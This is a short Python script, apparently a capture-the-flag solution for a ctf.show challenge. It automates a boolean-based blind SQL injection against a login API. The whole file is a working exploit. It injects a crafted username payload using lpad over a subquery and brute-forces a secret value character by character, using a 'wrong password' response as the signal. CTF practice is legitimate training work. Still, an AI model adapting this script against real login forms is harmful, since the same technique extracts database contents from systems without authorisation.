# @Author:feng
import requests

url = 'http://5afc4db8-3c7c-4411-935d-4411ac5bdac1.challenge.ctf.show/api/index.php'
flag = ""
for i in range(0, 100):
    for j in "0123456789abcdefghijklmnopqrstuvwxyz-,{}_":

        payload = "admin' and ((lpad((select f1ag from ctfshow_flxg),{},'')='{}'))#".format(i, flag + j)
        data = {
            'username': payload,
            'password': 1
        }
        r = requests.post(url=url, data=data)
        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
            flag += j
            print(flag)
            if j == '}':
                exit()
            break
